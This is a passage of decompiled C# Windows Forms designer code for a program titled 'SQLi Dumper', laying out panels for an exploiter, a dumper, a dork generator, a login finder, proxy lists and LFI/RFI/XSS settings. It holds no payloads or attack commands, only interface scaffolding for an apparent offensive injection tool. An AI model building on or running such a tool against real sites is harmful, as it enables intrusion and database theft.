		this.tsSQLiNoInjectable.RenderMode = ToolStripRenderMode.System;
		this.tsSQLiNoInjectable.ShowItemToolTips = false;
		this.tsSQLiNoInjectable.Size = new Size(612, 33);
		this.tsSQLiNoInjectable.TabIndex = 3;
		this.tsSQLiNoInjectable.Text = "ToolStrip2";
		this.cmbSQLiNoInjectableFilter.DropDownStyle = ComboBoxStyle.DropDownList;
		this.cmbSQLiNoInjectableFilter.Name = "cmbSQLiNoInjectableFilter";
		this.cmbSQLiNoInjectableFilter.Size = new Size(110, 33);
		this.cmbSQLiNoInjectableSearch.DropDownStyle = ComboBoxStyle.DropDownList;
		this.cmbSQLiNoInjectableSearch.Name = "cmbSQLiNoInjectableSearch";
		this.cmbSQLiNoInjectableSearch.Size = new Size(160, 33);
		this.btnSQLiNoInjectableSearchClear.DisplayStyle = ToolStripItemDisplayStyle.Image;
		this.btnSQLiNoInjectableSearchClear.Image = Class6.delete;
		this.btnSQLiNoInjectableSearchClear.ImageTransparentColor = Color.Magenta;
		this.btnSQLiNoInjectableSearchClear.Name = "btnSQLiNoInjectableSearchClear";
		this.btnSQLiNoInjectableSearchClear.Size = new Size(28, 30);
		this.btnSQLiNoInjectableSearchClear.Text = "Clear";
		this.txtSQLiNoInjectableSearch.Name = "txtSQLiNoInjectableSearch";
		this.txtSQLiNoInjectableSearch.Size = new Size(148, 33);
		this.btnSQLiNoInjectableSearch.Image = Class6.SearchContract_16x_24;
		this.btnSQLiNoInjectableSearch.ImageTransparentColor = Color.Magenta;
		this.btnSQLiNoInjectableSearch.Name = "btnSQLiNoInjectableSearch";
		this.btnSQLiNoInjectableSearch.Size = new Size(92, 30);
		this.btnSQLiNoInjectableSearch.Text = "Search";
		this.ToolStripSeparator13.Alignment = ToolStripItemAlignment.Right;
		this.ToolStripSeparator13.Name = "ToolStripSeparator13";
		this.ToolStripSeparator13.Size = new Size(6, 33);
		this.lblSQLiNoInjectable.Alignment = ToolStripItemAlignment.Right;
		this.lblSQLiNoInjectable.Name = "lblSQLiNoInjectable";
		this.lblSQLiNoInjectable.Size = new Size(166, 25);
		this.lblSQLiNoInjectable.Text = "lblSQLiNoInjectable";
		this.pnlSQLiDumper.Location = new Point(2144, 520);
		this.pnlSQLiDumper.Name = "pnlSQLiDumper";
		this.pnlSQLiDumper.Size = new Size(146, 32);
		this.pnlSQLiDumper.TabIndex = 347;
		this.mnuDownloads.ImageScalingSize = new Size(24, 24);
		this.mnuDownloads.Items.AddRange(new ToolStripItem[]
		{
			this.mnuDownloadsClear
		});
		this.mnuDownloads.Name = "mnuChecked";
		this.mnuDownloads.ShowImageMargin = false;
		this.mnuDownloads.ShowItemToolTips = false;
		this.mnuDownloads.Size = new Size(102, 34);
		this.mnuDownloadsClear.Name = "mnuDownloadsClear";
		this.mnuDownloadsClear.Size = new Size(101, 30);
		this.mnuDownloadsClear.Text = "Reset";
		this.pnlTools.AutoScroll = true;
		this.pnlTools.Controls.Add(this.btnToolsClean);
		this.pnlTools.Controls.Add(this.grbToolsConvertEnc);
		this.pnlTools.Controls.Add(this.grbToolsIP);
		this.pnlTools.Location = new Point(2144, 18);
		this.pnlTools.Name = "pnlTools";
		this.pnlTools.Size = new Size(620, 349);
		this.pnlTools.TabIndex = 41;
		this.btnToolsClean.Location = new Point(444, 740);
		this.btnToolsClean.Margin = new Padding(4, 5, 4, 5);
		this.btnToolsClean.Name = "btnToolsClean";
		this.btnToolsClean.Size = new Size(129, 35);
		this.btnToolsClean.TabIndex = 95;
		this.btnToolsClean.Text = "Clear Form";
		this.btnToolsClean.UseVisualStyleBackColor = true;
		this.grbToolsConvertEnc.Controls.Add(this.btnBase64ToText);
		this.grbToolsConvertEnc.Controls.Add(this.btnTextToBase64);
		this.grbToolsConvertEnc.Controls.Add(this.btnURLDecondingToText);
		this.grbToolsConvertEnc.Controls.Add(this.btnTextToURLEnconding);
		this.grbToolsConvertEnc.Controls.Add(this.txtTextValue);
		this.grbToolsConvertEnc.Controls.Add(this.cmbSQLChar);
		this.grbToolsConvertEnc.Controls.Add(this.butTextToSQLChar);
		this.grbToolsConvertEnc.Controls.Add(this.txtSQLCharDelimiter);
		this.grbToolsConvertEnc.Controls.Add(this.chkGroupChar);
		this.grbToolsConvertEnc.Controls.Add(this.btnHexToText);
		this.grbToolsConvertEnc.Controls.Add(this.txtSQLCharValue);
		this.grbToolsConvertEnc.Controls.Add(this.lblToolsConvertHexValue);
		this.grbToolsConvertEnc.Controls.Add(this.lblToolsConverSQLChar);
		this.grbToolsConvertEnc.Controls.Add(this.txtHexValue);
		this.grbToolsConvertEnc.Controls.Add(this.lblToolsConvertTextValue);
		this.grbToolsConvertEnc.Controls.Add(this.btnConvertTextToHex);
		this.grbToolsConvertEnc.Location = new Point(4, 9);
		this.grbToolsConvertEnc.Margin = new Padding(4, 5, 4, 5);
		this.grbToolsConvertEnc.Name = "grbToolsConvertEnc";
		this.grbToolsConvertEnc.Padding = new Padding(4, 5, 4, 5);
		this.grbToolsConvertEnc.Size = new Size(579, 554);
		this.grbToolsConvertEnc.TabIndex = 94;
		this.grbToolsConvertEnc.TabStop = false;
		this.grbToolsConvertEnc.Text = "Encoding \\ Deconding";
		this.btnBase64ToText.Enabled = false;
		this.btnBase64ToText.ForeColor = SystemColors.ControlText;
		this.btnBase64ToText.Location = new Point(372, 503);
		this.btnBase64ToText.Margin = new Padding(4, 5, 4, 5);
		this.btnBase64ToText.Name = "btnBase64ToText";
		this.btnBase64ToText.Size = new Size(195, 34);
		this.btnBase64ToText.TabIndex = 97;
		this.btnBase64ToText.Text = " Base64 to Text";
		this.btnBase64ToText.UseVisualStyleBackColor = true;
		this.btnTextToBase64.Enabled = false;
		this.btnTextToBase64.ForeColor = SystemColors.ControlText;
		this.btnTextToBase64.Location = new Point(170, 503);
		this.btnTextToBase64.Margin = new Padding(4, 5, 4, 5);
		this.btnTextToBase64.Name = "btnTextToBase64";
		this.btnTextToBase64.Size = new Size(195, 34);
		this.btnTextToBase64.TabIndex = 96;
		this.btnTextToBase64.Text = "Text to Base64";
		this.btnTextToBase64.UseVisualStyleBackColor = true;
		this.btnURLDecondingToText.Enabled = false;
		this.btnURLDecondingToText.ForeColor = SystemColors.ControlText;
		this.btnURLDecondingToText.Location = new Point(374, 460);
		this.btnURLDecondingToText.Margin = new Padding(4, 5, 4, 5);
		this.btnURLDecondingToText.Name = "btnURLDecondingToText";
		this.btnURLDecondingToText.Size = new Size(195, 34);
		this.btnURLDecondingToText.TabIndex = 95;
		this.btnURLDecondingToText.Text = "URL Dec. to Text";
		this.btnURLDecondingToText.UseVisualStyleBackColor = true;
		this.btnTextToURLEnconding.Enabled = false;
		this.btnTextToURLEnconding.ForeColor = SystemColors.ControlText;
		this.btnTextToURLEnconding.Location = new Point(170, 460);
		this.btnTextToURLEnconding.Margin = new Padding(4, 5, 4, 5);
		this.btnTextToURLEnconding.Name = "btnTextToURLEnconding";
		this.btnTextToURLEnconding.Size = new Size(195, 34);
		this.btnTextToURLEnconding.TabIndex = 94;
		this.btnTextToURLEnconding.Text = "Text to URL Enc.";
		this.btnTextToURLEnconding.UseVisualStyleBackColor = true;
		this.txtTextValue.ForeColor = SystemColors.ControlText;
		this.txtTextValue.Location = new Point(170, 29);
		this.txtTextValue.Margin = new Padding(4, 5, 4, 5);
		this.txtTextValue.Multiline = true;
		this.txtTextValue.Name = "txtTextValue";
		this.txtTextValue.Size = new Size(398, 139);
		this.txtTextValue.TabIndex = 82;
		this.cmbSQLChar.DropDownStyle = ComboBoxStyle.DropDownList;
		this.cmbSQLChar.FlatStyle = FlatStyle.Popup;
		this.cmbSQLChar.FormattingEnabled = true;
		this.cmbSQLChar.Location = new Point(171, 371);
		this.cmbSQLChar.Margin = new Padding(4, 5, 4, 5);
		this.cmbSQLChar.Name = "cmbSQLChar";
		this.cmbSQLChar.Size = new Size(134, 28);
		this.cmbSQLChar.TabIndex = 93;
		this.butTextToSQLChar.Enabled = false;
		this.butTextToSQLChar.ForeColor = SystemColors.ControlText;
		this.butTextToSQLChar.Location = new Point(420, 368);
		this.butTextToSQLChar.Margin = new Padding(4, 5, 4, 5);
		this.butTextToSQLChar.Name = "butTextToSQLChar";
		this.butTextToSQLChar.Size = new Size(150, 34);
		this.butTextToSQLChar.TabIndex = 91;
		this.butTextToSQLChar.Text = "Text to SQL Char";
		this.butTextToSQLChar.UseVisualStyleBackColor = true;
		this.txtSQLCharDelimiter.Enabled = false;
		this.txtSQLCharDelimiter.Location = new Point(318, 371);
		this.txtSQLCharDelimiter.Margin = new Padding(4, 5, 4, 5);
		this.txtSQLCharDelimiter.MaxLength = 5;
		this.txtSQLCharDelimiter.Name = "txtSQLCharDelimiter";
		this.txtSQLCharDelimiter.Size = new Size(91, 26);
		this.txtSQLCharDelimiter.TabIndex = 92;
		this.txtSQLCharDelimiter.Text = "+";
		this.chkGroupChar.AutoSize = true;
		this.chkGroupChar.CheckAlign = ContentAlignment.MiddleRight;
		this.chkGroupChar.Checked = true;
		this.chkGroupChar.CheckState = CheckState.Checked;
		this.chkGroupChar.ForeColor = SystemColors.ControlText;
		this.chkGroupChar.Location = new Point(42, 378);
		this.chkGroupChar.Margin = new Padding(4, 5, 4, 5);
		this.chkGroupChar.Name = "chkGroupChar";
		this.chkGroupChar.Size = new Size(118, 24);
		this.chkGroupChar.TabIndex = 87;
		this.chkGroupChar.Text = "Group Char";
		this.chkGroupChar.UseVisualStyleBackColor = true;
		this.btnHexToText.Enabled = false;
		this.btnHexToText.ForeColor = SystemColors.ControlText;
		this.btnHexToText.Location = new Point(374, 417);
		this.btnHexToText.Margin = new Padding(4, 5, 4, 5);
		this.btnHexToText.Name = "btnHexToText";
		this.btnHexToText.Size = new Size(195, 34);
		this.btnHexToText.TabIndex = 90;
		this.btnHexToText.Text = "Hex to Text";
		this.btnHexToText.UseVisualStyleBackColor = true;
		this.txtSQLCharValue.ForeColor = SystemColors.ControlText;
		this.txtSQLCharValue.Location = new Point(170, 334);
		this.txtSQLCharValue.Margin = new Padding(4, 5, 4, 5);
		this.txtSQLCharValue.Name = "txtSQLCharValue";
		this.txtSQLCharValue.Size = new Size(397, 26);
		this.txtSQLCharValue.TabIndex = 85;
		this.lblToolsConvertHexValue.ForeColor = SystemColors.ControlText;
		this.lblToolsConvertHexValue.Location = new Point(21, 182);
		this.lblToolsConvertHexValue.Margin = new Padding(4, 0, 4, 0);
		this.lblToolsConvertHexValue.Name = "lblToolsConvertHexValue";
		this.lblToolsConvertHexValue.Size = new Size(144, 28);
		this.lblToolsConvertHexValue.TabIndex = 86;
		this.lblToolsConvertHexValue.Text = "Hex value";
		this.lblToolsConvertHexValue.TextAlign = ContentAlignment.MiddleRight;
		this.lblToolsConverSQLChar.ForeColor = SystemColors.ControlText;
		this.lblToolsConverSQLChar.Location = new Point(21, 337);
		this.lblToolsConverSQLChar.Margin = new Padding(4, 0, 4, 0);
		this.lblToolsConverSQLChar.Name = "lblToolsConverSQLChar";
		this.lblToolsConverSQLChar.Size = new Size(144, 28);
		this.lblToolsConverSQLChar.TabIndex = 88;
		this.lblToolsConverSQLChar.Text = "SQL char value";
		this.lblToolsConverSQLChar.TextAlign = ContentAlignment.MiddleRight;
		this.txtHexValue.ForeColor = SystemColors.ControlText;
		this.txtHexValue.Location = new Point(170, 182);
		this.txtHexValue.Margin = new Padding(4, 5, 4, 5);
		this.txtHexValue.Multiline = true;
		this.txtHexValue.Name = "txtHexValue";
		this.txtHexValue.Size = new Size(398, 139);
		this.txtHexValue.TabIndex = 84;
		this.lblToolsConvertTextValue.ForeColor = SystemColors.ControlText;
		this.lblToolsConvertTextValue.Location = new Point(21, 29);
		this.lblToolsConvertTextValue.Margin = new Padding(4, 0, 4, 0);
		this.lblToolsConvertTextValue.Name = "lblToolsConvertTextValue";
		this.lblToolsConvertTextValue.Size = new Size(144, 28);
		this.lblToolsConvertTextValue.TabIndex = 83;
		this.lblToolsConvertTextValue.Text = "Text value";
		this.lblToolsConvertTextValue.TextAlign = ContentAlignment.MiddleRight;
		this.btnConvertTextToHex.Enabled = false;
		this.btnConvertTextToHex.ForeColor = SystemColors.ControlText;
		this.btnConvertTextToHex.Location = new Point(170, 417);
		this.btnConvertTextToHex.Margin = new Padding(4, 5, 4, 5);
		this.btnConvertTextToHex.Name = "btnConvertTextToHex";
		this.btnConvertTextToHex.Size = new Size(195, 34);
		this.btnConvertTextToHex.TabIndex = 89;
		this.btnConvertTextToHex.Text = "Text to Hex";
		this.btnConvertTextToHex.UseVisualStyleBackColor = true;
		this.grbToolsIP.Controls.Add(this.numPingPort);
		this.grbToolsIP.Controls.Add(this.btnPing);
		this.grbToolsIP.Controls.Add(this.btnResolve);
		this.grbToolsIP.Controls.Add(this.txtResolveCountry);
		this.grbToolsIP.Controls.Add(this.txtResolveIP);
		this.grbToolsIP.Controls.Add(this.picResolveFlag);
		this.grbToolsIP.Controls.Add(this.lblToolsIPAddress);
		this.grbToolsIP.Controls.Add(this.lblToolsIP);
		this.grbToolsIP.Controls.Add(this.lblToolsIPCountry);
		this.grbToolsIP.Controls.Add(this.txtResolveAddress);
		this.grbToolsIP.Controls.Add(this.lblToolsIPport);
		this.grbToolsIP.Location = new Point(4, 563);
		this.grbToolsIP.Name = "grbToolsIP";
		this.grbToolsIP.Size = new Size(579, 168);
		this.grbToolsIP.TabIndex = 80;
		this.grbToolsIP.TabStop = false;
		this.grbToolsIP.Text = "IP Pinger/Host to Country";
		this.numPingPort.Location = new Point(494, 83);
		NumericUpDown numPingPort = this.numPingPort;
		int[] array27 = new int[4];
		array27[0] = 1410065407;
		array27[1] = 2;
		numPingPort.Maximum = new decimal(array27);
		NumericUpDown numPingPort2 = this.numPingPort;
		int[] array28 = new int[4];
		array28[0] = 1;
		numPingPort2.Minimum = new decimal(array28);
		this.numPingPort.Name = "numPingPort";
		this.numPingPort.Size = new Size(76, 26);
		this.numPingPort.TabIndex = 78;
		this.numPingPort.TextAlign = HorizontalAlignment.Right;
		NumericUpDown numPingPort3 = this.numPingPort;
		int[] array29 = new int[4];
		array29[0] = 80;
		numPingPort3.Value = new decimal(array29);
		this.btnPing.Enabled = false;
		this.btnPing.Font = new Font("Tahoma", 8.25f);
		this.btnPing.Location = new Point(426, 123);
		this.btnPing.Margin = new Padding(4, 5, 4, 5);
		this.btnPing.Name = "btnPing";
		this.btnPing.Size = new Size(142, 34);
		this.btnPing.TabIndex = 76;
		this.btnPing.Text = "Ping";
		this.btnPing.UseVisualStyleBackColor = true;
		this.btnResolve.BackgroundImageLayout = ImageLayout.Zoom;
		this.btnResolve.Font = new Font("Tahoma", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		this.btnResolve.ForeColor = SystemColors.ControlText;
		this.btnResolve.Location = new Point(170, 123);
		this.btnResolve.Name = "btnResolve";
		this.btnResolve.Size = new Size(248, 34);
		this.btnResolve.TabIndex = 67;
		this.btnResolve.Text = "&Resolve";
		this.btnResolve.UseVisualStyleBackColor = true;
		this.txtResolveCountry.ForeColor = SystemColors.ControlText;
		this.txtResolveCountry.Location = new Point(170, 89);
		this.txtResolveCountry.Name = "txtResolveCountry";
		this.txtResolveCountry.ReadOnly = true;
		this.txtResolveCountry.Size = new Size(246, 26);
		this.txtResolveCountry.TabIndex = 70;
		this.txtResolveIP.ForeColor = SystemColors.ControlText;
		this.txtResolveIP.Location = new Point(170, 55);
		this.txtResolveIP.Name = "txtResolveIP";
		this.txtResolveIP.ReadOnly = true;
		this.txtResolveIP.Size = new Size(246, 26);
		this.txtResolveIP.TabIndex = 68;
		this.picResolveFlag.BackgroundImageLayout = ImageLayout.Stretch;
		this.picResolveFlag.Location = new Point(114, 122);
		this.picResolveFlag.Name = "picResolveFlag";
		this.picResolveFlag.Size = new Size(42, 35);
		this.picResolveFlag.SizeMode = PictureBoxSizeMode.Zoom;
		this.picResolveFlag.TabIndex = 72;
		this.picResolveFlag.TabStop = false;
		this.lblToolsIPAddress.ForeColor = SystemColors.ControlText;
		this.lblToolsIPAddress.Location = new Point(33, 25);
		this.lblToolsIPAddress.Name = "lblToolsIPAddress";
		this.lblToolsIPAddress.Size = new Size(123, 26);
		this.lblToolsIPAddress.TabIndex = 66;
		this.lblToolsIPAddress.Text = "&Address";
		this.lblToolsIPAddress.TextAlign = ContentAlignment.MiddleRight;
		this.lblToolsIP.ForeColor = SystemColors.ControlText;
		this.lblToolsIP.Location = new Point(33, 54);
		this.lblToolsIP.Name = "lblToolsIP";
		this.lblToolsIP.Size = new Size(123, 26);
		this.lblToolsIP.TabIndex = 69;
		this.lblToolsIP.Text = "&IP";
		this.lblToolsIP.TextAlign = ContentAlignment.MiddleRight;
		this.lblToolsIPCountry.ForeColor = SystemColors.ControlText;
		this.lblToolsIPCountry.Location = new Point(33, 88);
		this.lblToolsIPCountry.Name = "lblToolsIPCountry";
		this.lblToolsIPCountry.Size = new Size(123, 26);
		this.lblToolsIPCountry.TabIndex = 71;
		this.lblToolsIPCountry.Text = "&Country";
		this.lblToolsIPCountry.TextAlign = ContentAlignment.MiddleRight;
		this.txtResolveAddress.ForeColor = SystemColors.ControlText;
		this.txtResolveAddress.Location = new Point(170, 22);
		this.txtResolveAddress.Name = "txtResolveAddress";
		this.txtResolveAddress.Size = new Size(398, 26);
		this.txtResolveAddress.TabIndex = 65;
		this.lblToolsIPport.Location = new Point(435, 86);
		this.lblToolsIPport.Margin = new Padding(4, 0, 4, 0);
		this.lblToolsIPport.Name = "lblToolsIPport";
		this.lblToolsIPport.Size = new Size(51, 26);
		this.lblToolsIPport.TabIndex = 79;
		this.lblToolsIPport.Text = "Port:";
		this.lblToolsIPport.TextAlign = ContentAlignment.MiddleRight;
		this.pnlStatistics.Controls.Add(this.lvwStatistics);
		this.pnlStatistics.Location = new Point(2144, 603);
		this.pnlStatistics.Name = "pnlStatistics";
		this.pnlStatistics.Size = new Size(604, 80);
		this.pnlStatistics.TabIndex = 42;
		this.lvwStatistics.Columns.AddRange(new ColumnHeader[]
		{
			this.ColumnHeader34,
			this.ColumnHeader35
		});
		this.lvwStatistics.Dock = DockStyle.Fill;
		this.lvwStatistics.FullRowSelect = true;
		this.lvwStatistics.GridLines = true;
		this.lvwStatistics.HideSelection = false;
		this.lvwStatistics.Location = new Point(0, 0);
		this.lvwStatistics.Name = "lvwStatistics";
		this.lvwStatistics.Size = new Size(604, 80);
		this.lvwStatistics.TabIndex = 3;
		this.lvwStatistics.UseCompatibleStateImageBehavior = false;
		this.lvwStatistics.View = View.Details;
		this.ColumnHeader34.Text = "Description";
		this.ColumnHeader34.Width = 212;
		this.ColumnHeader35.Text = "Value";
		this.ColumnHeader35.Width = 130;
		this.numSearchColumnThreads.BackColor = SystemColors.Window;
		NumericUpDown numSearchColumnThreads = this.numSearchColumnThreads;
		int[] array30 = new int[4];
		array30[0] = 10;
		numSearchColumnThreads.Increment = new decimal(array30);
		this.numSearchColumnThreads.Location = new Point(2146, 730);
		this.numSearchColumnThreads.Margin = new Padding(4, 5, 4, 5);
		NumericUpDown numSearchColumnThreads2 = this.numSearchColumnThreads;
		int[] array31 = new int[4];
		array31[0] = 1;
		numSearchColumnThreads2.Minimum = new decimal(array31);
		this.numSearchColumnThreads.Name = "numSearchColumnThreads";
		this.numSearchColumnThreads.Size = new Size(94, 26);
		this.numSearchColumnThreads.TabIndex = 43;
		NumericUpDown numSearchColumnThreads3 = this.numSearchColumnThreads;
		int[] array32 = new int[4];
		array32[0] = 10;
		numSearchColumnThreads3.Value = new decimal(array32);
		this.pnlLoginFinder.Location = new Point(2144, 559);
		this.pnlLoginFinder.Name = "pnlLoginFinder";
		this.pnlLoginFinder.Size = new Size(146, 32);
		this.pnlLoginFinder.TabIndex = 44;
		this.bckImport.WorkerReportsProgress = true;
		this.bckImport.WorkerSupportsCancellation = true;
		this.pnlDorkGenerator.Location = new Point(2296, 516);
		this.pnlDorkGenerator.Name = "pnlDorkGenerator";
		this.pnlDorkGenerator.Size = new Size(164, 75);
		this.pnlDorkGenerator.TabIndex = 45;
		this.pnlAnalizer.Location = new Point(2310, 383);
		this.pnlAnalizer.Name = "pnlAnalizer";
		this.pnlAnalizer.Size = new Size(88, 128);
		this.pnlAnalizer.TabIndex = 46;
		this.pnlTree.Dock = DockStyle.Left;
		this.pnlTree.Location = new Point(0, 0);
		this.pnlTree.Name = "pnlTree";
		this.pnlTree.Size = new Size(250, 979);
		this.pnlTree.TabIndex = 367;
		this.imlTree.ImageStream = (ImageListStreamer)componentResourceManager.GetObject("imlTree.ImageStream");
		this.imlTree.TransparentColor = Color.Black;
		this.imlTree.Images.SetKeyName(0, "SCANNER.bmp");
		this.imlTree.Images.SetKeyName(1, "SQLI.bmp");
		this.imlTree.Images.SetKeyName(2, "SQLIFAILED.bmp");
		this.imlTree.Images.SetKeyName(3, "DUMPER.bmp");
		this.imlTree.Images.SetKeyName(4, "FILECINSLUSAO.bmp");
		this.imlTree.Images.SetKeyName(5, "TRASH.bmp");
		this.imlTree.Images.SetKeyName(6, "PROXIES.bmp");
		this.imlTree.Images.SetKeyName(7, "TOOLS.bmp");
		this.imlTree.Images.SetKeyName(8, "LOGINFINDER.bmp");
		this.imlTree.Images.SetKeyName(9, "NOTEPAD.bmp");
		this.imlTree.Images.SetKeyName(10, "SETTINGS.bmp");
		this.imlTree.Images.SetKeyName(11, "ADVANCED.bmp");
		this.imlTree.Images.SetKeyName(12, "STATISTICS.bmp");
		this.imlTree.Images.SetKeyName(13, "ABOUT.bmp");
		this.imlTree.Images.SetKeyName(14, "HOME.bmp");
		this.imlTree.Images.SetKeyName(15, "TOOLS_CONVERT.bmp");
		this.imlTree.Images.SetKeyName(16, "SETTINGS2.bmp");
		this.twMain.Anchor = (AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
		this.twMain.Cursor = Cursors.Default;
		this.twMain.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, 0);
		this.twMain.FullRowSelect = true;
		this.twMain.HideSelection = false;
		this.twMain.Location = new Point(2549, 402);
		this.twMain.Margin = new Padding(4, 5, 4, 5);
		this.twMain.Name = "twMain";
		this.twMain.Size = new Size(199, 106);
		this.twMain.TabIndex = 345;
		base.AutoScaleDimensions = new SizeF(9f, 20f);
		base.AutoScaleMode = AutoScaleMode.Font;
		base.ClientSize = new Size(2583, 1119);
		base.Controls.Add(this.twMain);
		base.Controls.Add(this.pnlControls);
		base.Controls.Add(this.pnlTree);
		base.Controls.Add(this.pnlSockList);
		base.Controls.Add(this.pnlScanner);
		base.Controls.Add(this.pnlAnalizer);
		base.Controls.Add(this.pnlDorkGenerator);
		base.Controls.Add(this.pnlSQLi);
		base.Controls.Add(this.pnlSettings);
		base.Controls.Add(this.pnlLoginFinder);
		base.Controls.Add(this.numSearchColumnThreads);
		base.Controls.Add(this.pnlStatistics);
		base.Controls.Add(this.pnlSettingsAdvanced);
		base.Controls.Add(this.pnlTools);
		base.Controls.Add(this.pnlSQLiDumper);
		base.Controls.Add(this.pnlSQLiNoInjectable);
		base.Controls.Add(this.tsWorker);
		base.Controls.Add(this.pnlExploiter);
		base.Controls.Add(this.pnlWindows);
		base.Controls.Add(this.pnlTrash);
		base.Controls.Add(this.pnlNotepad);
		base.Controls.Add(this.pnlAbout);
		base.Controls.Add(this.numThreads);
		base.Controls.Add(this.grbHttpLog);
		base.Controls.Add(this.stMain);
		base.Margin = new Padding(4, 5, 4, 5);
		this.MinimumSize = new Size(985, 708);
		base.Name = "MainForm";
		base.StartPosition = FormStartPosition.CenterScreen;
		this.Text = "SQLi Dumper";
		this.stMain.ResumeLayout(false);
		this.stMain.PerformLayout();
		this.mnuListView.ResumeLayout(false);
		this.mnuSocks.ResumeLayout(false);
		this.pnlSockList.ResumeLayout(false);
		this.pnlSockList.PerformLayout();
		((ISupportInitialize)this.dtgSocks).EndInit();
		this.tsSocks.ResumeLayout(false);
		this.tsSocks.PerformLayout();
		this.pnlSettings.ResumeLayout(false);
		this.GroupBox2.ResumeLayout(false);
		this.grbUpdater.ResumeLayout(false);
		this.grbAppSetthings.ResumeLayout(false);
		this.GroupBox4.ResumeLayout(false);
		this.GroupBox4.PerformLayout();
		this.grbExploithing.ResumeLayout(false);
		this.GroupBox1.ResumeLayout(false);
		this.GroupBox1.PerformLayout();
		((ISupportInitialize)this.numExploitingDelay).EndInit();
		((ISupportInitialize)this.numHTTPTimeout).EndInit();
		((ISupportInitialize)this.numHTTPRetry).EndInit();
		((ISupportInitialize)this.numScanningDelay).EndInit();
		this.mnuExcludeUrlWords.ResumeLayout(false);
		this.pnlNotepad.ResumeLayout(false);
		this.pnlNotepad.PerformLayout();
		this.mnuAbout.ResumeLayout(false);
		this.pnlScanner.ResumeLayout(false);
		this.grbScannerURL.ResumeLayout(false);
		((ISupportInitialize)this.dtgQueue).EndInit();
		this.tsSearchFilter.ResumeLayout(false);
		this.tsSearchFilter.PerformLayout();
		this.grbDorks.ResumeLayout(false);
		this.grbDorks.PerformLayout();
		this.mnuQueue.ResumeLayout(false);
		this.pnlExploiter.ResumeLayout(false);
		this.pnlExploiter.PerformLayout();
		((ISupportInitialize)this.dtgFileInclusao).EndInit();
		this.tsFileInclusao.ResumeLayout(false);
		this.tsFileInclusao.PerformLayout();
		this.pnlTrash.ResumeLayout(false);
		((ISupportInitialize)this.dtgTrash).EndInit();
		this.mnuTrash.ResumeLayout(false);
		this.grbHttpLog.ResumeLayout(false);
		((ISupportInitialize)this.lvwHttpLog).EndInit();
		this.mnuHttpLog.ResumeLayout(false);
		((ISupportInitialize)this.VisualStyler1).EndInit();
		this.pnlSettingsAdvanced.ResumeLayout(false);
		this.grbXSS.ResumeLayout(false);
		this.mnuPaths.ResumeLayout(false);
		this.grbLfiLinux.ResumeLayout(false);
		this.tabFileInc.ResumeLayout(false);
		this.TabPage6.ResumeLayout(false);
		((ISupportInitialize)this.numLFIpathTraversalCount).EndInit();
		this.tpLfiWin.ResumeLayout(false);
		this.grbSQLi.ResumeLayout(false);
		this.tabSQLi.ResumeLayout(false);
		this.TabPage1.ResumeLayout(false);
		this.TabPage1.PerformLayout();
		((ISupportInitialize)this.numAnalizerUnionEnd).EndInit();
		((ISupportInitialize)this.numAnalizerUnionSart).EndInit();
		this.TabPage2.ResumeLayout(false);
		this.TabPage3.ResumeLayout(false);
		this.grbHTTPExploit.ResumeLayout(false);
		this.grbFileIncWAFs.ResumeLayout(false);
		this.grbRFI.ResumeLayout(false);
		this.grbRFI.PerformLayout();
		this.grbScanner.ResumeLayout(false);
		this.tabScanner.ResumeLayout(false);
		this.TabPage4.ResumeLayout(false);
		this.mnuScannerDomain.ResumeLayout(false);
		this.TabPage5.ResumeLayout(false);
		this.TabPage5.PerformLayout();
		((ISupportInitialize)this.numThreads).EndInit();
		this.tsWorker.ResumeLayout(false);
		this.tsWorker.PerformLayout();
		this.pnlSQLi.ResumeLayout(false);
		this.pnlSQLi.PerformLayout();
		((ISupportInitialize)this.dtgSQLi).EndInit();
		this.tsSearchColumn.ResumeLayout(false);
		this.tsSearchColumn.PerformLayout();
		this.tsSQLi.ResumeLayout(false);
		this.tsSQLi.PerformLayout();
		this.mnuSearchColumn.ResumeLayout(false);
		this.pnlSQLiNoInjectable.ResumeLayout(false);
		this.pnlSQLiNoInjectable.PerformLayout();
		((ISupportInitialize)this.dtgSQLiNoInjectable).EndInit();
		this.tsSQLiNoInjectable.ResumeLayout(false);
		this.tsSQLiNoInjectable.PerformLayout();
		this.mnuDownloads.ResumeLayout(false);
		this.pnlTools.ResumeLayout(false);
		this.grbToolsConvertEnc.ResumeLayout(false);
		this.grbToolsConvertEnc.PerformLayout();
		this.grbToolsIP.ResumeLayout(false);
		this.grbToolsIP.PerformLayout();
		((ISupportInitialize)this.numPingPort).EndInit();
		((ISupportInitialize)this.picResolveFlag).EndInit();
		this.pnlStatistics.ResumeLayout(false);
		((ISupportInitialize)this.numSearchColumnThreads).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	// Token: 0x1700037B RID: 891
	// (get) Token: 0x06000BBB RID: 3003 RVA: 0x00006C98 File Offset: 0x00004E98
	// (set) Token: 0x06000BBC RID: 3004 RVA: 0x00006CA0 File Offset: 0x00004EA0
	internal virtual StatusStrip stMain { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700037C RID: 892
	// (get) Token: 0x06000BBD RID: 3005 RVA: 0x00006CA9 File Offset: 0x00004EA9
	// (set) Token: 0x06000BBE RID: 3006 RVA: 0x00006CB1 File Offset: 0x00004EB1
	internal virtual ToolStripStatusLabel lblMainStatus { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

	// Token: 0x1700037D RID: 893
	// (get) Token: 0x06000BBF RID: 3007 RVA: 0x00006CBA File Offset: 0x00004EBA
	// (set) Token: 0x06000BC0 RID: 3008 RVA: 0x00056718 File Offset: 0x00054918
	internal virtual TreeViewExt twMain
	{
		[CompilerGenerated]
		get
		{
			return this._twMain;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			TreeNodeMouseClickEventHandler value2 = new TreeNodeMouseClickEventHandler(this.method_53);
			TreeViewCancelEventHandler value3 = new TreeViewCancelEventHandler(this.method_106);
			TreeViewExt twMain = this._twMain;
			if (twMain != null)
			{
				twMain.NodeMouseClick -= value2;
				twMain.BeforeSelect -= value3;
			}
			this._twMain = value;
			twMain = this._twMain;
			if (twMain != null)
			{
				twMain.NodeMouseClick += value2;
				twMain.BeforeSelect += value3;
			}
		}
	}

	// Token: 0x1700037E RID: 894
	// (get) Token: 0x06000BC1 RID: 3009 RVA: 0x00006CC2 File Offset: 0x00004EC2
